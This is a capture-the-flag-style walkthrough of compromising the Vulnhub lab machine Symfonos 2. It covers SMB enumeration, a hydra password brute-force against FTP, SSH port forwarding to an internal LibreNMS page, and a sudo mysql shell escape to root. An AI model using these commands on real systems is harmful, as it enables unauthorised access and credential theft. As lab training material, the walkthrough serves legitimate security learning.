Today, We are going to pwn Symfonos 2 by Zayotic from Vulnhub

## Description:

```
OSCP-like Intermediate real life based machine designed to teach the importance of understanding a vulnerability. SHOULD work for both VMware and Virtualbox.
```

Lets Begin with our Initial Scan

Lot of Ports open, I started with ``smb``

## SMB :

We can use smbmap to see is there any files available.

 > smbmap - SMB enumeration tool

> -H HOST   		IP of host

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos2/1.png)

So ``anonymous`` is having ``log.txt`` in ``/backups`` which is readable.

There is a tool called ``smbclient`` which helps to access to the server.

> smbclient - ftp-like client to access SMB/CIFS resources on servers

I tried login with ``anonymous`` without password and it worked, Downloaded the ``log.txt`` to my machine.

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos2/2.png)

``log.txt`` 

Its the ``smb`` configuration, the Interesting thing is 


shadow file is stored in /var/backups/shadow.bak
``
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
``


The exact path of the SMB share 
```
[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes
```
There is also FTP Conf file 

``root@symfonos2:~# cat /usr/local/etc/proftpd.conf``

So FTP is running under the user ``aeolus`` not anonymous.
```
# Set the user and group under which the server will run.
User				aeolus
Group				aeolus
```

## FTP :

We know the FTP is running under ``aeolus`` user but we don't have the password for it, So I started bruteforcing it using ``hydra``.

>hydra - a very fast network logon cracker which supports many different services


>hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.101

``aeolus : sergioteamo ``

Its the same ``log.txt`` we got from ``SMB``

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos2/4.png)

## SSH :

I used the same creds for ``ssh``

``aeolus : sergioteamo ``

## Privilege Escalation :

Uploaded My Enumeration script to the machine and found some ports are listening to the machine.

```
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
---
tcp    LISTEN     0      80     127.0.0.1:3306                  *:*                  
tcp    LISTEN     0      128    127.0.0.1:8080                  *:*                  
tcp    LISTEN     0      20     127.0.0.1:25                    *:*                  
---
```

```
Port 3306 - MySQL
Port 25 - SMTP
Port 8080 - Webpage (Maybe)
```
I confirmed it by using ``curl``, There is a login page.
```
aeolus@symfonos2:/tmp$ curl localhost:8080
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url=http://localhost:8080/login" />

        <title>Redirecting to http://localhost:8080/login</title>
    </head>
    <body>
        Redirecting to <a href="http://localhost:8080/login">http://localhost:8080/login</a>.
    </body>
</html>You have new mail in /var/mail/aeolus
```

We can't see port 8080 directly so We need to do [Port Forward](https://en.wikipedia.org/wiki/Port_forwarding) by doing this we can access the webpage from our machine.

For that press ``~C`` will open ssh interactive shell and then ``-L 8081:127.0.0.1:8080`` Which port forward 8080 to 8081.

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos2/6.png)

``http://127.0.0.1:8081/``

It's ``LibreNMS`` Login page.
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos2/7.png)

I searched for any exploits available and found this.

![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos2/8.png)

Now we got ``cronus`` user shell.<br/>
![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/symfonos2/9.png)

The First thing I did is ``sudo -l`` 

```
$ sudo -l
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```
Looks like ``mysql`` can run as root without password.

I searched in [GTFOBins](https://gtfobins.github.io/gtfobins/mysql/)

> sudo mysql -e '\! /bin/sh'
